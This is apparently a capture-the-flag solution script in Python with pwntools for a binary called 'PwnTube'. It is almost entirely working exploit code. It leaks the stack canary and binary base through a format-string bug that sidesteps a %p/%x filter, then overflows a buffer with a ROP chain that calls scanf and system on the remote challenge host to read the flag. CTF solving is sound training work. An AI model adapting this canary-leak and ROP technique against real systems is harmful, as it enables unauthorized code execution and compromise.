from pwn import *
from time import sleep

context.log_level = "error"

''''

by reversing you can access the buy_premieum function with "777" as input

Vulnerability 1: 
Buffer overflow in the buy_premium function but canary nead to be leak in order to exploit it

Vulnerability 2: 
format string in the showComments function , small restriction with %p and %x 
but bypass with %lp / %lx / %ld  in  order to leak the canary and binary base

exploit: 

ROP => call scanf on a writeable memory (GOT in my case) and write our command
       call system

'''

def formatString():
    '''
    usefull in order to have an idea of the buy_premium stack frame 
    (position of the canary and main adresse on the stack)
    '''
   
    for i in range(500):
        p = process("./PwnTube")
        p.sendline(b'777')
        p.sendline(b'5')
        p.sendline(b'2')
        p.sendline(b'A'*10)
        p.sendline(b'B'*10)

        # gdb.attach(p,gdbscript='''
        # set follow-fork-mode parent
        # b* buy_premium+421
    
        # b* buy_premium+199
        # b* buy_premium+207
        # b* main+875                      
        # ''')
        p.sendline(b'4')
        payload = "%{}$lx".format(str(i)).encode()
        p.sendline(payload)
        sleep(0.4)
        p.sendline(b'3')
        p.recv(4096)
        p.recv(4096)
        p.recv(4096)
        p.recvuntil(b'First!!! :D')
        leak_stack = p.recv().split(b'1.')[0].strip()
        print(i, "leak: ",(leak_stack))
        #p.interactive()
        p.close()

'''
position : 

71 cookie
 
55 leak:  b'55555555576b' => main

'''

def exploit():
 
    p = remote("pwntube.challs.srdnlen.it",1661)
    #p = process("./PwnTube")
    p.sendline(b'777')
    p.sendline(b'5')
    p.sendline(b'2')
    p.sendline(b'A'*10)
    p.sendline(b'B'*10)


    p.sendline(b'4')
    payload = "%{}$lp".format(str(71)).encode()
    p.sendline(payload)
    sleep(0.4)
    p.sendline(b'3')
    p.recv(4096)
    p.recv(4096)
    p.recvuntil(b'First!!! :D')
    leak_canary = int(p.recv().split(b'1.')[0].strip(),16)
    print("leak canary: ",hex(leak_canary),leak_canary)

    p.sendline(b'4')
    payload = "-%{}$lp".format(str(55)).encode()
    p.sendline(payload)
    sleep(0.4)
    p.sendline(b'3')
    p.recv(4096)
    p.recv(4096)
    p.recvuntil(b'First!!! :D')
    leak_base = int(p.recv().split(b'1.')[0].strip().split(b"-")[1],16)-0x000000000000176b
    print("leak base: ",hex(leak_base))
  
   
    pop_rsi_rdi = leak_base+ 0x00000000000015a9
    pop_rdi = leak_base+ 0x00000000000015aa

    system_got = leak_base + 0x5020
  
    scanf_plt = leak_base+0x00000000000010b0

    system_call = leak_base + 0x11e7
    print("system_got: ", hex(system_got))

    main_binary = leak_base+0x000000000000176b

    # gdb.attach(p,gdbscript='''
    # set follow-fork-mode parent
    # b* buy_premium+421
    
    # b* buy_premium+199
    # b* buy_premium+207
    # b* main+875                      
    # ''')

    percent_seven_string =leak_base+ 0x379a # %16s
    where_write= leak_base + 0x5048#0x5018


    p.sendline(b'5')

    p.sendline(b'2')

    #  exploit goes hereee
    payload_f = b'A'*504
    payload_f+= p64(leak_canary)
    payload_f+=p64(where_write) # sRBP
    payload_f+=p64(pop_rsi_rdi)
    payload_f+=p64(where_write)
    payload_f+=p64(percent_seven_string)
    payload_f+=p64(scanf_plt) # scanf 
    payload_f+=p64(pop_rdi)
    payload_f+=p64(where_write)
    payload_f+=p64(system_call) 


 
    p.sendlineafter(b'name:',payload_f)


    p.sendlineafter(b'number:',b'B'*8)
    
    p.sendline(b"cat<flag.txt\x00") # scanf input
    
    p.interactive()


exploit()

# srdnlen{pwn4t1n4?}
